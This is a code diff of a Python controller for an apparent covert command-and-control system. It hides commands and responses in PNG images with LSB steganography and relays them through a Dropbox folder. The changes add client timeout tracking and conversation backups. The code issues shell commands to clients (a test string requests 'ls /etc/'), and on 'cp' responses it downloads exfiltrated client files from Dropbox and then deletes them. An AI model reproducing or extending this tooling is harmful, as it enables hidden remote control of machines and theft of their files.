@@ -14,13 +14,18 @@ HEARTBEAT_PERIOD = 180
 
 CHECK_PERIOD = 30
 
-TIMEOUT = HEARTBEAT_PERIOD*4
+TIMEOUT = HEARTBEAT_PERIOD*3
 
 tmp_path = None
 backup_path = None
 
 def current_datetime():
     return datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+
+def get_last_command_time(message):
+    last_command = message.split(';')[-2]
+    return datetime.strptime(last_command.split('|')[0], "%d/%m/%Y %H:%M:%S")
 
 
 def init(access_token):
@@ -154,6 +159,11 @@ def process_files(dbx, last_check, clients):
 
         message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
 
+        last_time = get_last_command_time(message)
+
+        if last_check >= last_time:
+            continue
+        
         for line in message.split(';')[:-1]:
             fields = line.split('|')
             #print(fields)
@@ -161,17 +171,28 @@ def process_files(dbx, last_check, clients):
             print("Received")
             print(fields)           
             if last_check < response_time and fields[1] == 'RESPONSE':
-                if fields[2] == 'heartbeat' or fields[2] == 'register':
-                    print("Heartbeat detected")
-                    #clients[entry.name] = response_time
-                elif fields[2].split(' ')[0] == 'cp':
-                    print(fields[3])
+                if fields[2] in ['heartbeat', 'register']:
+                    continue
+
+                print(fields[3])
+                if fields[2].split(' ')[0] == 'cp':
                     file_name = fields[3].split('\n')[1]
                     if file_name != 'cp error - no such file':
                         dbx.files_download_to_file(backup_path + file_name, '/art/' + file_name)
                         dbx.files_delete('/art/' + file_name)
-                else:
-                    print(fields[3])
+
+      
+
+def backup_communication(message, client):
+    lines = message.split(';')
+    f = open(backup_path + client[:-4] + '.txt', "w")
+    f.write(';\n\n'.join(lines))
+    f.close()
+
+
+def cleanup(dbx, client):
+    dbx.files_delete('/art/' + client)
+    os.remove(tmp_path + client)
 
 
 def update_timedout_clients(dbx, timedout_clients):
@@ -182,15 +203,13 @@ def update_timedout_clients(dbx, timedout_clients):
 
         message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
 
-        last_command = message.split(';')[-2]
-        last_time = datetime.strptime(last_command.split('|')[0], "%d/%m/%Y %H:%M:%S")
+        last_time = get_last_command_time(message)
         diff = datetime.now() - last_time 
         if diff.seconds > TIMEOUT:
             #register client as timed out
             timedout_clients.append(entry.name)
-            #clean up
-            dbx.files_delete(entry.path_lower)
-            os.remove(tmp_path + entry.name)
+            backup_communication(message, entry.name)
+            cleanup(dbx, entry.name)
 
     return timedout_clients
 
@@ -208,12 +227,7 @@ if __name__ == "__main__":
 
         dbx = init(sys.argv[1])
 
-        #clients = init_clients()
         timedout_clients = update_timedout_clients(dbx, [])
-
-        #print("Timedout clients")
-        #print(timedout_clients)
-        #print("")
 
         last_heartbeat = datetime.now()
         last_check = datetime.now()
@@ -238,43 +252,13 @@ if __name__ == "__main__":
             # read command
             res = handle_command_selection(dbx, timedout_clients, selected_client) 
             if res == -1:
+                clients = get_alive_clients(dbx, timedout_clients)
+                for client in clients:
+                    dbx.files_download_to_file(tmp_path + client, '/art/' + client)
+                    message = lsb.reveal(tmp_path + client, lsb.generators.eratosthenes())
+
+                    backup_communication(message, client)
+                    cleanup(dbx, client)
                 break
             elif res >= 0 or res == -3:
                 selected_client = res
-
-
-
-""" if __name__ == "__main__":
-    img_size = (128,128)
-    img = get_random_image(img_size)
-
-    matplotlib.image.imsave('test.png', img)
-    secret = lsb.hide("./test.png", "Hello world!\n",  lsb.generators.eratosthenes())
-    secret.save("./test.png")
-
-    for i in range(100):
-        print(i)
-        message = lsb.reveal("./test.png", lsb.generators.eratosthenes())
-        message += str(i) + '\n'
-        secret = lsb.hide("./test.png", message,  lsb.generators.eratosthenes())
-        secret.save("./test.png")
-        #lsb.hide("./test.png", message,  lsb.generators.eratosthenes())
-
-    print("Out")
-    print(lsb.reveal("./test.png", lsb.generators.eratosthenes())) """
-
-""" if __name__ == '__main__':
-    #test_str = "30/12/2023 19:56:59|REQUEST|ls /etc/|ahston|"
-    #print(test_str.split('|'))
-    dbx = init(sys.argv[1])
-    #execute_command(dbx, 'heartbeat', 'test_test.png')
-
-    client = 'incising.png'
-     
-    for entry in dbx.files_list_folder('/art').entries:
-        if entry.name == client:
-            dbx.files_download_to_file("./" + entry.name, entry.path_lower)
-
-    message = lsb.reveal(client, lsb.generators.eratosthenes())
-    
-    print(message.split(';')[0].split('|')) """
